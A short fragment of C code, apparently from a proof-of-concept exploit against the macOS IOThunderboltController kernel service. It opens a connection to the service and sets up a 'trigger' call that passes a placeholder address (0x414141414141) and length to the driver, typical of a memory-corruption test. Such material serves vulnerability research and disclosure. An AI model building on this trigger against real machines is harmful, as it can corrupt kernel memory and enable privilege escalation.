...
io_connect_t get_connection(mach_port_t task_port) {
  kern_return_t err;
  mach_port_t service = IOServiceGetMatchingService(kIOMasterPortDefault, IOServiceMatching("IOThunderboltController"));
...
void trigger(int child_pid, mach_port_t child_task_port) {
  ...
  uint64_t inputScalar[6] = {0};
  size_t inputScalarCnt = 6;

  inputScalar[4] = 0x414141414141; // address
  inputScalar[5] = 0x1000; //length
